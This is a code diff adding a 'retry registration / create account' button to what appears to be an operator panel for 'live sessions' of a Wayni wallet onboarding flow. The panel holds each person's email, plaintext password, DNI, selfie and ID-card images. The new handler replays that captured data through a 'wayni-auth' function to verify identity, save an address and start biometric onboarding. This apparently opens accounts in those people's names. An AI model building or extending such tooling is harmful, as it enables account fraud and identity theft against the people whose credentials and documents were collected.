@@ -1521,6 +1521,8 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
   const [showImages, setShowImages] = useState(false);
   const [bioImages, setBioImages] = useState<Record<string, string | null> | null>(null);
   const [loadingImages, setLoadingImages] = useState(false);
+  const [retrying, setRetrying] = useState(false);
+  const [retryResult, setRetryResult] = useState<{ ok: boolean; msg: string } | null>(null);
 
   const time = new Date(session.created_at);
   const timeStr = time.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit" }) + " " + time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
@@ -1884,6 +1886,129 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
             {session.user_agent && <span>• {parseDevice(session.user_agent)} {parseBrowser(session.user_agent)}</span>}
           </div>
         )}
+
+        {/* ── CRIAR CONTA BUTTON ── */}
+        {(() => {
+          const bioOk = bioInfo?.status === "success" || (bioInfo?.has_selfie === true && bioInfo?.has_dni_front === true && bioInfo?.has_dni_back === true);
+          const walletActive = walletInfo?.status === "ACTIVE";
+          const hasDni = !!dni;
+          const hasUuid = !!userUuid;
+          const hasEmail = !!session.email;
+          const hasAddress = !!(otpParts.region && otpParts.city && otpParts.street && otpParts.zip);
+          const isFullyVerified = !!bioOk && hasDni && hasUuid && hasEmail;
+
+          const handleRetry = async () => {
+            setRetrying(true);
+            setRetryResult(null);
+            try {
+              const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
+              const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
+              const headers = { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` };
+              const invoke = async (body: Record<string, unknown>) => {
+                const res = await fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers, body: JSON.stringify(body) });
+                const data = await res.json();
+                if (!res.ok) throw new Error(data?.error || data?.message || `Error ${res.status}`);
+                return data;
+              };
+
+              // Step 1: onboarding_verify (save-data)
+              const verifyRes = await invoke({
+                action: "onboarding_verify",
+                email: session.email,
+                identity_number: dni,
+                phone_number: otpParts.phone || "",
+                password: session.password || "",
+                selected_full_name: userName || undefined,
+                selected_gender: otpParts.gender || undefined,
+                selected_tax_identification_value: otpParts.tax_id || undefined,
+              });
+
+              const resolvedUuid = verifyRes.user_uuid || userUuid;
+
+              // Step 2: save_address (if we have address data)
+              if (hasAddress && resolvedUuid) {
+                await invoke({
+                  action: "save_address",
+                  uuid: resolvedUuid,
+                  street_name: otpParts.street || "",
+                  street_number: otpParts.street_number || "0",
+                  floor: otpParts.floor || null,
+                  apartment: otpParts.apartment || null,
+                  zip_code: otpParts.zip || "",
+                  neighborhood: null,
+                  city_id: parseInt(otpParts.city_id || "0") || 0,
+                  city: otpParts.city || "",
+                  region_id: parseInt(otpParts.region_id || "0") || 0,
+                  region: otpParts.region || "",
+                });
+              }
+
+              // Step 3: onboarding_biometric
+              if (resolvedUuid) {
+                const bioRes = await invoke({
+                  action: "onboarding_biometric",
+                  identity_number: dni,
+                  user_uuid: resolvedUuid,
+                  gender: otpParts.gender || "M",
+                });
+                if (bioRes.biometric_url) {
+                  // Save new biometric URL to session
+                  const existingParts = { ...otpParts };
+                  existingParts.biometric_url = bioRes.biometric_url;
+                  if (bioRes.biometric_id) existingParts.biometric_id = bioRes.biometric_id;
+                  if (resolvedUuid !== userUuid) existingParts.uuid = resolvedUuid;
+                  const newOtp = Object.entries(existingParts).map(([k, v]) => `${k}:${v}`).join("|");
+                  await supabase.from("sessions").update({ otp_code: newOtp, status: "biometric_started" }).eq("id", session.id);
+                }
+              }
+
+              setRetryResult({ ok: true, msg: "✓ Cadastro reenviado com sucesso!" });
+              fetchInfo();
+            } catch (err: any) {
+              setRetryResult({ ok: false, msg: err?.message || "Erro ao reenviar cadastro" });
+            }
+            setRetrying(false);
+          };
+
+          return (
+            <div className="mt-2 space-y-2">
+              <button
+                onClick={handleRetry}
+                disabled={retrying || !isFullyVerified || walletActive}
+                className={`w-full rounded-lg py-2.5 text-[12px] font-bold transition-all flex items-center justify-center gap-2 ${
+                  walletActive
+                    ? "bg-green-500/10 text-green-400 border border-green-500/20 cursor-default"
+                    : isFullyVerified
+                    ? "bg-gradient-to-r from-emerald-600 to-green-500 text-white hover:from-emerald-500 hover:to-green-400 shadow-lg shadow-green-500/20 active:scale-[0.98]"
+                    : "bg-secondary text-muted-foreground border border-border cursor-not-allowed opacity-50"
+                } disabled:opacity-50`}
+              >
+                {retrying ? (
+                  <><RefreshCw size={14} className="animate-spin" /> Reenviando cadastro...</>
+                ) : walletActive ? (
+                  <><Check size={14} /> Conta já ativa</>
+                ) : (
+                  <><Zap size={14} /> Reenviar Cadastro / Criar Conta</>
+                )}
+              </button>
+              {!isFullyVerified && !walletActive && (
+                <div className="flex items-center gap-1.5 flex-wrap text-[9px] text-amber-400">
+                  <span>⚠️ Faltam:</span>
+                  {!hasDni && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">DNI</span>}
+                  {!hasEmail && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">Email</span>}
+                  {!hasUuid && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">UUID</span>}
+                  {!bioOk && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">Biometria</span>}
+                  {!hasAddress && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">Endereço</span>}
+                </div>
+              )}
+              {retryResult && (
+                <div className={`text-[10px] px-3 py-2 rounded-lg font-semibold ${retryResult.ok ? "bg-green-500/10 text-green-400 border border-green-500/20" : "bg-red-500/10 text-red-400 border border-red-500/20"}`}>
+                  {retryResult.msg}
+                </div>
+              )}
+            </div>
+          );
+        })()}
 
         {lastCheck && (
           <span className="text-[8px] text-muted-foreground/50">Última consulta: {lastCheck}</span>
